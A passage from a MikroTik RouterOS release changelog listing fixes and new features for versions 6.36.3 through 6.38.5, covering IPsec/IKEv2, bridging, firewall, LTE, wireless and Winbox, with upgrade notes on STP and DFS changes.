*) winbox - added "static-virtual" to wireless CAP;
*) winbox - added GPS menu;
*) winbox - added protected routerboard parameters under routerboard settings menu;
*) winbox - allow shorten bytes to k,M,G in firewall "connection-bytes" and "connection-rates";
*) winbox - allow to change user password to empty one;
*) winbox - allow to not specify certificate in IPSec peer settings;
*) winbox - allow to specify "route-distance" in "dhcp-client" if "special-classless" mode is selected;
*) winbox - allow to specify certificate type when exporting it;
*) winbox - allow to specify interfaces that CAPsMAN can use for management;
*) winbox - allow unhide SNMP passwords;
*) winbox - allowed to specify static-dns as list;
*) winbox - do not allow Packet Sniffer "memory-limit" and "file-limit" lower than 10KiB;
*) winbox - do not create time field when copying CAPsMAN access list entry;
*) winbox - do not show "dpd-max-failures" on IKEv2;
*) winbox - do not show empty LTE fields in Info menu;
*) winbox - do not start Traffic Generator automatically when opening "Quick Start";
*) winbox - do not try to disable dynamic items from firewall tables;
*) winbox - fixed "Montly" typo to "Monthly" in Graphing menu;
*) winbox - fixed CAPsMAN channels frequency (allow to specify a list of them);
*) winbox - fixed IPSec "mode-config" DNS settings;
*) winbox - fixed issue when working IPSec policies were shown as invalid;
*) winbox - fixed misleading error when trying to export certificate;
*) winbox - fixed typo in BGP advertisements menu Aggragator->Aggregator;
*) winbox - hide "wps-mode" & "security-profile" in wireless nv2 mode;
*) winbox - hide health menu on RB450;
*) winbox - improved "/tool torch";
*) winbox - increased maximal number of Winbox sessions 20->100;
*) winbox - properly name CAP Interface on new interface creation;
*) winbox - properly show "dhcp-server" warnings;
*) winbox - properly show IPSec "installed-sa" "enc-algorithm" when it is aes-gcm;
*) winbox - properly show wireless registration table stat counters;
*) winbox - removed "sfp-rate-select" setting from ethernet interface;
*) winbox - removed unnecessary "/system health" menu on "hAP ac lite";
*) winbox - set default "dhcp-client" "default-route-distance" value to 1;
*) winbox - show "A" flag for IPSec policies;
*) winbox - show "H" flag for IPSec installed SAs;
*) winbox - show PoE-OUT current, voltage and power only on devices which can report these values;
*) wireless - added Egypt 5.8 country settings;
*) wireless - added PEAP authentication support for wireless station mode;
*) wireless - apply broadcast bit to DHCP requests when using "station-pseudobridge" mode;
*) wireless - do not allow equal MAC addresses between multiple Virtual APs when same "master-interface" is used;
*) wireless - fixed RBSXT5HacD2nr2 small channel support;
*) wireless - fixed crash while running "spectral-scan";
*) wireless - fixed dynamic wireless interface removal from bridge ports when changing wireless mode;
*) wireless - fixed false positive DFS radar detection caused by iPhone 6s devices;
*) wireless - fixed issue when wireless interfaces might not show up in CAP mode;
*) wireless - fixed occasional crash on interface disabling;
*) wireless - fixed rare crash on nv2 configurations;
*) wireless - fixed rare wireless ac interface lockup;
*) x86 - added support for NVMe SSD disk drives;

What's new in 6.38.5 (2017-Mar-09 11:32):

!) www - fixed http server vulnerability;

What's new in 6.38.4 (2017-Mar-08 09:26):

*) chr - fixed problem when transmit speed was reduced by interface queues;
*) dhcpv6-server - require "address-pool" to be specified;
*) export - do not show "read-only" IRQ entries;
*) filesystem - implemented procedures to verify and restore internal file structure integrity upon upgrading;
*) firewall - do not allow to set "time" parameter to 0s for "limit" option;
*) hotspot - fixed redirect to URL where escape characters are used (requires newly generated HTML files);
*) hotspot - show Host table commentaries also in Active tab and vice versa;
*) ike1 - fixed “xauth” Radius login;
*) ike2 - also kill IKEv2 connections on proposal change;
*) ike2 - always limit empty remote selector;
*) ike2 - fixed proposal change crash;
*) ike2 - fixed responder subsequent new child creation when PFS is used;
*) ike2 - fixed responder TS updating on wild match;
*) ipsec - deducted policy SA src/dst address from src/dst address;
*) ipsec - do not require "sa-dst-address" if "action=none" or "action=discard";
*) ipsec - fixed SA address check in policy lookup;
*) ipsec - hide SA address for transport policies;
*) ipsec - keep policy in kernel even with bad proposal;
*) ipsec - kill ph2 on policy removal;
*) ipsec - updated/fixed Radius attributes;
*) irq - properly detect all IRQ entries;
*) l2tp-client - fixed IPSec policy generation after reboot;
*) l2tp-client - require working IPSec encryption if "use-ipsec=yes";
*) lcd - show fan2 speed only if it is available;
*) profile - classify ethernet driver activity properly in ARM architecture;
*) snmp - added SSID to CAPsMAN registration table;
*) snmp - fixed "/tool snmp-get" crash on session timeout;
*) snmp - fixed CAPsMAN registration table OID print;
*) snmp - fixed situation when SNMP could not read "/system health" values after reboot;
*) userman - allow access to User Manager users page only through "/user" URL;
*) userman - show warning when no users are selected for CSV file generation;
*) winbox - do not hide "power-cycle-after" option;
*) winbox - hide advertise tab in Hotspot user profile configuration if "transparent-proxy" is not enabled;
*) winbox - make "power-cycle-interval" not to depend on "power-cycle-ping-enabled" in PoE settings;
*) winbox - properly show BGP communities in routing filters table filter;
*) wireless - fixed scan tool stuck in background;
*) wireless - improved compatibility with Intel 2200BG wireless card;

What's new in 6.38.3 (2017-Feb-07 09:52):

*) bridge - do not add dynamic hardware STP ports if “master-port” is not capable of hardware STP;
*) bridge - fixed rare crash when hardware STP capable interface gets new “master-port” which already is in bridge;
*) bridge - fixed rare situation when port flapping occurs on bridge ports;
*) bridge - fixed STP/RSTP packet receive on all types of bridge ports;
*) bridge - minor improvements in performance when "master-port" is bridge port;
*) capsman - fixed SGI (Short Guard Interval) support;
*) dhcp - do not listen on IPv4/IPv6 client to IPv6 MLD packets;
*) dude - (changes discussed here: http://forum.mikrotik.com/viewtopic.php?f=21&t=116356);
*) firewall - added "fasttrack" dummy rule to "/ip firewall raw" table;
*) firewall - do not show IPv4 “fastpath” as active if “route-cache” is disabled;
*) firewall - fixed import of exported configuration that had updated "limit" setting;
*) graphing - fixed graphing crash when high amount of traffic is processed;
*) hotspot - fixed rare kernel crash on multicore systems;
*) ike1 - fixed responder xauth trailing null;
*) leds - fixed defaults for RBSXT5HacD2nr2;
*) mmips - improved general stability;
*) rb3011 - fixed noise from buzzer after silent boot;
*) switch - fixed crash when trying to configure second master port on the same chipset (RB3011, RB2011, CCR1009-8G-1S+);
*) usb - added missing USB ethernet drivers to arm & tile architecture;
*) winbox - added "add-relay-info" and "relay-info-remote-id" to DHCP relay;
*) winbox - added H flag to "/ip arp" ;
*) winbox - added missing "use-fan2" and "active-fan2" to "/system health";
*) winbox - allow shorten bytes to k,M,G in bridge firewall just like in “/ip firewall”;
*) winbox - do not hide 00:00:00:00:00:00 MAC address in unpublished ARPs;
*) winbox - fixed matching "connection-state=untracked" connections;
*) winbox - fixed typo in “/system resources pci” list;
*) winbox - make "power-cycle-after" show correct value;
*) winbox - updated fan management menu;
*) wireless - added "station-roaming" setting;
*) wireless - update Thailand country frequency settings;

What's new in 6.38.2 (2017-Jan-17 08:45):

*) factory only release;

What's new in 6.38.1 (2017-Jan-13 05:51):

*) bridge - disallow manual removal of dynamic bridge ports;
*) bridge - fixed MAC address learning from switch master-port;
*) bridge - fixed access loss to device through bridge if master port had a loop (introduced in v6.38);
*) certificate - added year cap (invalid-after date will not exceed year 2039);
*) certificate - fixed fail on import from CAPs when both key and name already exist;
*) dhcpv6-client - fixed DHCPv6 rebind on startup;
*) dhcpv6-server - fixed server removal crash if static binding was present;
*) dns - fixed typo in regexp error message;
*) dude - (changes discussed here: http://forum.mikrotik.com/viewtopic.php?f=21&t=116356);
*) fan - improved RPM monitor on CCR1009;
*) firewall - nat action "netmap" now requires to-addresses to be specified;
*) health - report fan speed for RB800 and RB1100 when 3-pin fan is being used;
*) ike1 - fixed ph1 rekey in setups with mode-cfg;
*) ike2 - allow empty selectors to reach policy handler;
*) ike2 - auto-negotiate split nets;
*) ike2 - default to tunnel mode in setups without policy;
*) ike2 - fixed error packet from initiator on responder reply;
*) ike2 - fixed initiator TS updating;
*) ike2 - fixed ph1 initial-contact rare desync;
*) ike2 - fixed policy setting for /0 selector with different address families;
*) ike2 - fixed split policy active flag;
*) ike2 - fixed traffic selector prefix calculation;
*) ike2 - fixed xauth add check;
*) ike2 - include identity in peer address info;
*) ike2 - log empty TS payload;
*) ike2 - minor logging update;
*) ike2 - show peer identity of connected peers;
*) ike2 - traffic selector improvements;
*) ike2 - update also local port when peer changes port;
*) ike2 - use first split net for empty TS;
*) ike2 - use standard retransmission timers for DPD;
*) ike2 - xauth like auth method with user support;
*) ipsec - added ability to kill particular remote-peer;
*) ipsec - fixed flush speed and SAs on startup;
*) ipsec - fixed peer port export;
*) ipsec - port is used only for initiators;
*) ipv6 - added warning about having interface MTU less than minimal IPv6 packet fragment (1280);
*) license - fixed demo license expiration after installation on x86;
*) log - improved firewall log messages when NAT has changed only connection ports;
*) logs - work on false CPU/RAM overclocked alarms;
*) mpls - fixed crash on active tunnel loss in MPLS TE setups;
*) ovpn - fixed address acquisition when ovpn-in interface becomes slave;
*) proxy - fixed "max-cache-object-size" export;
*) proxy - speed-up almost empty disk cache clean-up;
*) quickset - various small changes;
*) rb751u - fixed ethernet LEDs (broken since 6.38rc16);
*) ssh - fixed high memory consumption when transferring file over ssh tunnel;
*) webfig - show properly large BGP AS numbers;
*) winbox - added "make-static" to IPv6 DHCP server bindings;
*) winbox - added "prefix-pool" to DHCPv6 server binding;
*) winbox - added IPsec to radius services;
*) winbox - added upstream flag to IGMP proxy interfaces;
*) winbox - allow to specify "connection-bytes" & "connection-rate" for any protocol in “/ip firewall” rules;
*) winbox - allow to specify "sip-timeout" under ip firewall service-ports;
*) winbox - do not create empty rates.vht-basic/supported-mcs if not specified in CAPsMAN;
*) winbox - hide "nat-traversal" setting in IPsec peer if IKEv2 is selected;
*) winbox - show dynamic IPv6 pools properly;
*) winbox - show errors on IPv6 addresses;
*) winbox - specify metric for “/ip dns cache-used” setting;
*) wireless - show comment on "security-profile" if it is set;

What's new in 6.38 (2016-Dec-30 11:33):

Important note!!!
RouterOS v6.38 contains STP/RSTP changes which makes bridges compatible with IEEE 802.1Q-2014 by sending and processing BPDU packets without VLAN tag.
To avoid STP/RSTP compatibility issues with older RouterOS versions, upgrade RouterOS to v6.38 on all routers in Layer2 networks with VLAN and STP/RSTP configurations.
The recommended procedure is to start by upgrading the remotest routers and gradually do it to the Root Bridge device.
If after upgrade you experience loss of connectivity, then disabling STP/RSTP on RouterOS bridge interface will restore connectivity so you can complete upgrade process on your network.

!) ipsec - added IKEv1 xauth user authentication with RADIUS "/ip ipsec user settings set xauth-use-radius=yes";
!) ipsec - added IKEv2 support;
!) ipsec - added IKEv2 EAP RADIUS passthrough authentication for responder;
!) ipsec - added support for unique policy generation;
!) ipsec - removed IKEv1 ah+esp support;
!) snmp - added basic get and walk functionality "/tool snmp-[get|walk]";
!) switch - added hardware STP functionality for CRS devices and small Atheros switch chips (http://wiki.mikrotik.com/wiki/Manual:CRS_examples#Spanning_Tree_Protocol);
!) tr069-client - initial implementation (as separate package) (cli only);
!) winbox - Winbox 3.7 is the minimum version that can connect to RouterOS;
*) arp - added "local-proxy-arp" feature;
*) bonding - added "forced-mac-address" option;
*) bonding - fixed "tx-drop" on VLAN over bonding on x86;
*) bridge - fixed rare crash on bridge port removal;
*) bridge - fixed VLAN BPDU rx and tx when connected to non-RouterOS device with STP functionality;
*) bridge - require admin-mac to be specified if auto-mac is disabled;
*) bridge - show bridge port name in port monitor;
*) capsman - added "group-key-update" parameter;
*) capsman - added possibility to change arp, mtu, l2mtu values in datapath configuration;
*) capsman - fixed CAP upgrade when separate wireless package is used (introduced in 6.37);
*) capsman - use correct source address in reply to unicast discovery requests;
*) ccr - added AHCI driver for Samsung XP941 128GB AHCI M.2;
*) certificates - added support for PKCS#12 export;
*) certificates - allow import multiple certs with the same key;
*) certificates - fixed crash when crl is removed while it is being fetched;
*) certificates - fixed trust chain update on local certificate revocation in programs using ssl;
*) certificates - if no name provided create certificate name automatically from certificate fields;
*) console - fixed multi argument value unset;
*) crs - added comment ability in more switch menus;
*) crs - fixed rare kernel failure on switch reset (for example, reboot);
*) dhcp - fixed DNS server assignment to client if dynamic server exists and is from another IP family;
*) dhcp - fixed issue when dhcp-client was still possible on interfaces with "slave" flag and using slave interface MAC address;
*) dhcp - show dhcp server as invalid and log an error when interface becomes a slave;
*) dhcp-server - fixed when wizard was unable to create pool >dhcp_pool99;
*) discovery - added LLDP support;
*) discovery - removed 6to4 tunnels from "/ip neighbor discovery menu";
*) dns - added "max-concurrent-queries" and "max-concurrent-tcp-sessions" settings;
*) dude - (changes discussed here: http://forum.mikrotik.com/viewtopic.php?f=8&t=112599);
*) ethernet - added "k" and "M" unit support to Ethernet Bandwidth setting;
*) ethernet - fixed "tx-fcs-error" on SFP+ interfaces when loop-protect is enabled;
*) export - do not show interface comment in "/ip neighbor discovery" menu;
*) export - updated default values to clean up export compact;
*) fastpath - fixed rare crash;
*) fastpath - fixed x86 bridge fast-path status shown as active even if it is manually disabled;
*) file - fixed file manager crash when file transfer gets cancelled;
*) firewall - added "creation-time" to address list entries;
*) firewall - added sctp/dccp/udp-lite support for "src-port", "dst-port", "port" and "to-ports" firewall options;
*) firewall - do not defragment packets which are marked with "notrack" in raw firewall;
*) firewall - fixed "time" option by recognizing weekday properly (introduced in v6.37.2);
*) firewall - fixed dynamic raw rule behaviour;
*) firewall - fixed rule activation if "time" option is used and no other active rules are present;
*) firewall - increased max size of connection tracking table to 1048576;
*) firewall - new faster "connection-limit" option implementation;
*) firewall - significantly improved large firewall rule set import performance;
*) graphing - fixed queue graphs showing up in web interface if aggregate name size >57840 symbols;
*) health - show power consumption on devices which has voltage and current monitor;
*) hotspot - fixed nat rule port setting in "hs-unauth-to" chain by changing it from "dst-port" to "src-port" on Walled Garden ip "return" rules;
*) interface - changed loopback interface mtu to 1500;
*) interface - do not treat multiple zeros as single zero on name comparison;
*) interface - show link stats in "/interface print stats-detail" output;
*) ipsec - added ability to specify static IP address at "send-dns" option;
*) ipsec - added ph2 accounting for each policy "/ip ipsec policy ph2-count";
*) ipsec - allow to specify explicit split dns address;
*) ipsec - changed logging topic from error to debug when empty pfkey messages are received;
*) ipsec - do not auto-negotiate more SAs than needed;
*) ipsec - ensure generated policy refers to valid proposal;
*) ipsec - fixed camellia crypto algorithm module loading;
*) ipsec - fixed IPv6 remote prefix;
*) ipsec - fixed kernel failure on tile with sha256 when hardware encryption is not being used;
*) ipsec - fixed peer configuration my-id IPv4 address endianness;
*) ipsec - fixed ph2 auto-negotiation by checking policies in correct order;
*) ipsec - load ipv6 related modules only when ipv6 package is enabled;
*) ipsec - make generated policies always as unique;
*) ipsec - non passive peers will also establish SAs from policy without waiting for the first packet;
*) ipsec - optimized logging under ipsec topic;
*) ipsec - show active flag when policy has active SA;
*) ipsec - show SA "enc-key-size";
*) ipsec - split "mode-config" and "send-dns" arguments;
*) ipv6 - added "no-dad" setting to ipv6 addresses;
*) ipv6 - fixed "accept-router-advertisements" behaviour;
*) ipv6 - moved empty IPv6 pool error message to error topic;
*) lcd - improved performance, causes less cpu load;
*) led - fixed dark mode for cAP 2nD (http://wiki.mikrotik.com/wiki/Manual:System/LEDS#Leds_Setting);
*) log - fixed "System rebooted because of kernel failure" message to show after 1st crash reboot;
*) lte - added support for more Vodafone K4201-Z, Novatel USB620L, PANTECH UML295 and ZTE MF90 modems;
*) lte - allow to execute concurrent info commands;
*) lte - fixed dwm-222, Pantech UML296 support;
*) lte - fixed init delay after power reset;
*) lte - increased delay when setting sms send mode;
*) lte - return info data when all the fields are populated;
*) metarouter - fixed startup process (introduced in 6.37.2);
*) mmips - fixed traffic accounting in "/interface" menu;
*) ospf - fixed route crash caused by memory corruption when there are multiple active interfaces;
*) ppp - fixed packet size calculation when MRRU is set (was 2 bytes bigger than MTU allows);
*) ppp - significantly improved shutdown speed on servers with many active tunnels;
*) ppp - significantly improved tunnel termination process on servers with many active tunnels;
*) profile - added "bfd" and "remote-access" processes;
*) profile - added ability to monitor cpu usage per core;
*) profile - make profile work on mmips devices;
*) profile - properly classify "wireless" processes;
*) queue - fixed "time" option by recognizing weekday properly (introduced in v6.37.2);
*) radius - added IPSec service (cli only);
*) rb750Gr3 - fixed ipsec with 3des+md5 to work on this board;
*) rb850Gx2 - fixed pcb temperature monitor if temperature was above 60C;
*) resolver - ignore cache entries if specific server is used;
*) routerboot - show log message if router CPU/RAM is overclocked;
*) script - increment run count value when script is executed from snmp;
*) snmp - always report bonding speed as speed from first bonding slave;
*) snmp - fixed rare crash when incorrectly formatted packet was received;
*) snmp - provide sinr in lte table;
*) ssh - added routing-table setting (cli only);
*) ssh - fixed lost "/ip ssh" settings on upgrade from version older than 5.15;
*) system - reboot device on critical program crash;
*) tile - fixed kernel failure when when IPv6 ICMP packet is sent through PPP interface;
*) time - updated time zones;
*) traceroute - fixed memory leak;
*) traffic-flow - fixed flow sequence counter and length;
*) trafficgen - fixed compact export when "header-stack" includes tcp;
*) trafficgen - fixed crash when IPv6 traffic is processed;
*) trafficgen - fixed potential crash when very big frame is generated;
*) trafficgen - improved fastpath support;
*) tunnel - fixed transmit packets occasionally not going through fastpath;
*) tunnel - properly export keepalive value;
*) usb - fixed kernel failure when Nexus 6P device is removed;
*) users - added minimal required permission set for full user group;
*) users - added TikApp policy;
*) vlan - allow to add multiple VLANs which name starts with same number and has same length;
*) vrrp - do not show unrelated log warning messages about version mismatch;
*) watchdog - do not send supout file if "auto-send-supout" is disabled;
*) webfig - added extra protection against XSS exploits;
*) webfig - show ipv6 addresses correctly;
*) webfig - show properly interface last-link-up/down times;
*) winbox - added "Complete" flag to arp table;
*) winbox - added "untracked" option to firewall "connection-state" setting;
*) winbox - added Dude icon to Dude menu;
*) winbox - allow to enable/disable traffic flow targets;
*) winbox - allow to run profile from "/system resources" menu;
*) winbox - allow to specify interface for leds with "interface-speed" trigger;
*) winbox - do not allow to set "loop-protect-send-interval" to 0s;
*) winbox - do not show hotspot user profile incoming and outgoing filters and marks as set if there is no value specified;
*) winbox - fixed crash when legacy Winbox version was used;
*) winbox - fixed default values for interface "loop-protect-disable-time" and "loop-protect-send-interval";
*) winbox - fixed missing "IPv6/Settings" menu;
*) winbox - fixed typo in "propagate-ttl" setting;
*) winbox - make cert signing include provided ca-crl-host;
*) winbox - moved ipsec peer "exchange-mode" to General tab;
*) winbox - properly show VHT basic and supported rates in CAPsMAN;
*) winbox - removed spare values from loop-protect menu;
*) winbox - show all related HT tab settings in 2GHz-g/n mode;
*) winbox - show primary and secondary ntp addresses as 0.0.0.0 if none are set;
*) winbox - show proper ipv6 connection timeout;
*) wireless - added API command to report country-list (/interface/wireless/info/country-list);
*) wireless - added CRL checking for eap-tls;
*) wireless - fixed action frame handling for WDS nodes;
*) wireless - fixed custom channel extension-channel appearance in console;
*) wireless - fixed full "spectral-history" header print on AP modes;
*) wireless - fixed rare kernel failure when connecting to nv2 access point with legacy rate select;
*) wireless - fixed upgrade from older wireless packages when AP interface had empty SSID;
*) wireless - take in account channel width when returning supported channels;
*) wireless - use VLAN ID 0 in RADIUS message to disable VLAN tagging;

What's new in 6.37.3 (2016-Nov-28 11:11):

*) bgp - do not match all prefixes tagged with community 0:0 by routing filters;
*) bridge - fixed filter Ingress Priority option (broken in 6.36rc8);
*) chr - fixed crash on "/interface print" (introduced in 6.36.4);
*) chr - fixed crash on "/system reboot" and "/system shutdown";
*) crs226 - fixed sfp-sfpplus1 link re-negotiation (broken in 6.37rc28/v6.37.1);
*) disk - fixed issue when disk was renamed after reboot on devices with flash disks;
*) dns - do not resolve incorrect addresses after changes made in static dns entries;
*) dns - improved static dns entry add speed when regexp is being used;
*) dude - (changes discussed here: http://forum.mikrotik.com/viewtopic.php?f=8&t=112598);
*) firewall - fixed filter rule "limit" parameter by making it visible again;
*) firewall - fixed interface slave state recognition (broken in 6.37.2);
*) firewall - fixed timeout option on address lists with domain name;
*) log - ignore email topic if action is email;
*) mipsbe - improved memory allocation on devices with nand when file transfer and tcp traffic processing is on progress;
*) route - fixed memory leak when route cache is disabled;
*) tile - fixed rare kernel failure when IPv6 neighbor discovery packet is received;
*) traceroute - fixed crash when too many sessions are active;
*) tunnel - allow to force mtu value when actual-mtu is already the same;
*) winbox - recognize properly tcp in traffic-generator packet-template header type;
*) winbox - show HT MCS tab if 2GHz-G/N band is used;

What's new in 6.37.2 (2016-Nov-08 13:15):

Important note!!!
Dude client auto-upgrade to this version will not work. Use http://www.mikrotik.com/download for 6.37.2 client download/install.
It will be fixed in soon to be released v6.37.3

Changes since 6.37.1:

!) ethernet - optimized packet processing on low load when irq re-balance is not necessary;
!) fastpath - let one packet per second through slow path to properly update connection timeouts;
!) queues - significantly improved hashing algorithm in dynamic simple queue setups (fixes CPU load spikes on queue removal);
*) arm - improved watchdog reliability;
*) bonding - fixed 802.3ad load balancing over routed VLANs with fastpath enabled;
*) bonding - fixed mac address selection after upgrade;
*) crs - fixed port mirroring halt after L2MTU change;
*) dhcp - do not allow to create dhcp-server on slave interface;
*) ethernet - fixed interface speed reporting for x86 in log after reboot or if "disable-running-check=yes";
*) ethernet - fixed potential loopprotect crash;
*) export - fixed "/interface ethernet switch export" on some boards;
*) export - fixed CRS switch egress-vlan-tag export;
*) fastpath - fixed kernel failure when fastpath traffic goes into loop;
*) fastpath - improved connection tracking timeout updates;
*) firewall - do not allow to increase/decrease ttl and hop-limit by 0;
*) firewall - fixed "connection-state" value disappearance in rules that were created before v6.22;
*) firewall - fixed compact export (introduced in 6.37rc14);
*) firewall - improved "time" option (ranges like 22h-10h now are acceptable);
*) hotspot - fixed nat rule dst-port by making it visible again for Walled Garden ip return rules;
*) ipsec - changed logging topic from error to debug for ph2 transform mismatch messages;
*) ipv6 - increased default max-neighbor-entries value to 8192, same as ipv4;
*) mmips - improved watchdog reliability;
*) package - show minimal supported RouterOS version under "/system resource" menu if it is specified;
*) queue - fixed rare crash on statistic gathering in "/queue tree";
*) queue - improved "time" option (ranges like 22h-10h are now usable);
*) rb2011 - fixed crash on l2mtu changes;
*) sms - fixed crash after modem has failed to start;
*) ssl - fixed potential memory leak ( when using dude for example);
*) torch - fixed aggregate statistics appearance;
*) traffic-flow - fixed dst-port reporting if connection is not maintained by connection tracking;
*) userman - fixed memory leak on user limitation calculations;
*) winbox - added led settings menu;
*) winbox - fixed missing switch menu for mmips devices;

What's new in 6.37.1 (2016-Sep-30 10:28):

!) package - fixed wireless package status after upgrade to 6.37 (extra reboot after upgrade is necessary);
!) ssl - fixed peer address/dns verification from certificate (affects sstp, fetch, capsman);
!) winbox - now Winbox 3.6 is the minimum version that can connect to RouterOS;
*) console - fixed typo in web-proxy (passthru to passhtrough);
*) dude - (changes discussed here: http://forum.mikrotik.com/viewtopic.php?f=8&t=112599);
*) export - do not show mac-address in export when it is not necessary;
*) firewall - fixed dynamic dummy firewall rules appearance in raw tables;
*) hotspot - fixed nat rule dst-port by making it visible again;
*) led - fixed default led settings for wAP2nDr2;
*) snmp - do not allow to execute script if user does not have write permission;
*) tile - do not reboot device after watchdog disable/enable;
*) userman - always re-fetch table data when switching between different menus;
*) userman - fixed timezone adjustment in reports;
*) webfig - fixed channel selection in check-for-update menu in Firefox;
*) winbox - added loop-protect settings;
*) winbox - added passthrough state to web-proxy;
*) winbox - allow to unset http-proxy field for sstp client;
*) winbox - do not show health menu on RB951-2n;
*) winbox - fixed typo in dhcpv6 relay (DCHP to DHCP);
*) winbox - show address expiration time in dhcp client list;
*) wireless - show DFS flag in country-info command output;

What's new in 6.37 (2016-Sep-23 08:20):

--- IMPORTANT! WIRELESS PACKAGE CHANGES:

There will be only one "wireless" package starting from RouterOS v6.37.

--- IMPORTANT! DFS CHANGES:

DFS configuration in RouterOS has been redesigned, now device looks at specified country settings (/interface wireless info country-info), and applies corresponding DFS mode for each frequency range automatically, making dfs-mode setting unnecessary.

Please, check that your frequencies work with corresponding DFS settings before upgrade.

!) console - dfs-mode setting does not exist any more and all scripts with such setting will not be executed;
!) dude - (changes discussed here: http://forum.mikrotik.com/viewtopic.php?f=8&t=110424);
!) dude - from now on dude will use winbox port and it will be changed automatically both in client loader and agent configuration;
!) ethernet - added new loop-protect feature for ethernet, vlan, eoip, eoipv6 interfaces, http://wiki.mikrotik.com/wiki/Manual:Loop_Protect ;
!) wireless - "wireless" package included in bundle "routeros" package;
!) wireless - "wireless-cm2" discontinued;
!) wireless - "wireless-rep" renamed to "wireless";
!) wireless - DFS option is removed, corresponding DFS mode for each frequency range applies automatically;
*) capsman - fixed kernel crash on cap while changing client-to-client forwarding;
*) capsman - report radio-name in registration table;
*) certificate - do not allow to remove certificate template while signing certificate;
*) console - hotspot setup show wrong certificate name;
*) defconf - fixed default configuration restore if virtual wireless interface were present;
*) defconf - fixed default configuration when wireless package is used;
*) defconf - using caps button now forces all wireless interfaces in caps mode;
*) dhcpv6 - improved interface status tracking;
*) dhcpv6 - reworked DHCP-PD server interface and route management;
*) dhcpv6 - update DUID when system-id changes (solves problem when cloned VM retains the same DUID);
*) dns - fixed crash when using regexp static dns entries;
*) ethernet - added support for LAN9514 ethernet dongle;
*) ethernet - allow to force mtu value when actual-mtu is already the same;
*) ethernet - fixed loop-protect on bridged ports;
*) ethernet - fixed never ending loop in CDP packet processing;
*) ethernet - fixed rare kernel failure on non-switch ethernet reset;
*) ethernet - rb44ge now have disabled-running-check=no by default;
*) firewall - added additional matchers for firewall raw rules;
*) firewall - fixed time based rules on time/timezone changes (again);
*) gps - always check NMEA checksum if available;
*) health - do not show psu and fan information for passive cooling devices;
*) hotspot - show comments from user menu also in active menu;
*) ipsec - fixed crash with enabled fragmentation;
*) ipsec - fixed dynamic policy not deleted on disconnect for nat-t peers;
*) ipsec - fixed fragmentation use negotiation;
*) ipsec - fixed kernel crash when sha512 was used;
*) ipv6 - fixed RA and RS processing on new interfaces after many interfaces have lost link during prolonged operation;
*) ipv6 - improved system responsiveness when ipv6 routes are frequently modified;
*) ipv6 - show multiple neighbors with the same address;
*) kvm - fix add/remove of disabled interfaces;
*) kvm - fixed guest crashing when using mtu bigger than 1504;
*) l2tp - fixed kernel failure when fastpath handles l2tp packets;
*) leds - added option to disable all leds on RBcAP2n;
*) lte - added ability to send/receive sms using '/tool sms';
*) lte - added dlink dwm-157 D, dwm-222 support;
*) lte - added huawei me909s variant;
*) lte - added initial deregistration only for bandrich modems;
*) lte - added logging for usb config switching;
*) lte - added Pantech UML295, Vodafone K4201-Z, ZTE MF823/MF831 support;
*) lte - added rndis for ZTE MF8xx;
*) lte - added support for more dlink dwm-222 configurations;
*) lte - added switch for Huawei K5160;
*) lte - added zte K5008-Z back;
*) lte - adjusted usb config for dlink dwm-157 D;
*) lte - fixed at chat condition storage;
*) lte - fixed band setting for sxt lte;
*) lte - fixed band unsetting;
*) lte - fixed default channels for dlink dwm-157;
*) lte - fixed ip activation when CREG (circuit switched) state remains in not registered state;
*) lte - fixed setting correct lte band for sxt lte;
*) lte - process initial state change to deregistred, when lockup occurs;
*) lte - reset if sms storage set fails;
*) mpls - fixed memory leak;
*) mpls - fixed vpls throughput issues caused by out-of-order packets;
*) ntp - fixed ntp server when local-clock used (like usb gps module);
*) partitions - added ability to add comments;
*) ppp - use default-route-distance when adding ipv6 default route;
*) ppp,lte - pin is now converted to string argument;
*) pppoe - fixed disconnects by idle timeout when fastpath is used;
*) quickset - added 2GHz-g/n band support;
*) quickset - fixed guest reporting in "home ap dual" mode;
*) quickset - fixed wireless frequency fields in "home ap dual" mode;
*) rb3011 - fixed rare occasions when router would hang while loading kernel;
*) routing - improved kernel performance in setups with large routing tables;
*) sfp - enabled eeprom printout in /interface ethernet monitor;
*) sfp - fixed initial eeprom reading on CCR1036-8G-2S+ and CCR1072-1G-8S+;
*) sfp - removed "sfp-rate-select" as command was not relevant to currently supported hardware;
*) sms - moved incorrectly logged message from async to gsm topic;
*) sms - report error when unsupported modem is being used;
*) snmp - added script table which executes script and returns it's output on get request;
*) snmp - require write permitions for script run table access;
*) snmp - skip forbidden oids on getnext completion;
*) sstp - allow to specify proxy by dns name;
*) sstp - now supports TLS_ECDHE algorithms;
*) supout - fixed bug that could cause enormous size supout.rif files;
*) supout - improved crash report generation for tile architecture;
*) switch - added comment field for CRS switch VLANs;
*) traffic-flow - allow ipv6 src address to be optional;
*) traffic-flow - fixed IPFIX packet timestamp;
*) traffic-flow - fixed IPFIX wrong flow sequence;
*) trafficgen - add per stream packet count setting;
*) trafficgen - show out-of-order packet counters in stats printouts;
*) tunnel - fixed communication via tunnel to router itself if fastpath was active;
*) tunnel - fixed ipv6 link-local address adding for gre;
*) tunnel - increased minimal MRRU to 1500 for PPP interfaces;
*) tunnel - ipv6 link-local address is now generated from tunnel local-address;
*) usb - added support for SMSC95XX USB Ethernet dongle on mipsbe;
*) usermanager - fixed rare crash on paypal payment;
*) users - fixed script policy checking against user policies when running scripts;
*) webfig - do not crash if radius server does not give out encryption keys;
*) webfig - fixed certificate signing;
*) winbox - added auto refresh for BFD neighbors;
*) winbox - added comment field support for switch vlan menu;
*) winbox - added default-authentication parameter for wireless station modes;
*) winbox - added src-address field for traffic-flow target;
*) winbox - adjust on-event field dynamically depending on window size;
*) winbox - adjusted allowed values for http-proxy field;
*) winbox - disabled MRRU by default for PPP interfaces;
*) winbox - display actual-mtu for tunnels in interfaces window;
*) winbox - fixed disconnect when no windows were opened for a while in unsecure mode;
*) winbox - fixed multiline read only fields not displaying new line characters;
*) winbox - fixed raw firewall showing jump targets from filter chains;
*) winbox - hide ethernet flow control settings for interfaces which does not support them;
*) winbox - removed health menu from devices that do not support it;
*) winbox - removed L2MTU field for PPP interfaces;
*) winbox - removed L2MTU field from PPP server binding settings;
*) winbox - removed unset button for L2MTU field;
*) winbox - show firmware-type in routerboard window;
*) wireless - display DFS flag in country info;
*) wireless - improved driver support for RB953, hAP ac, wAP ac;
*) wireless - send deauth to data frames in scan mode.
*) wireless - updated brazil country settings;

What's new in 6.36.3 (2016-Sep-05 08:09):

*) arp - fixed crash that caused Ethernet frames to go out via wrong interface;
*) fastpath - fixed kernel crash on interface disable/remove;
*) fetch - fixed bug with incomplete files in https mode;
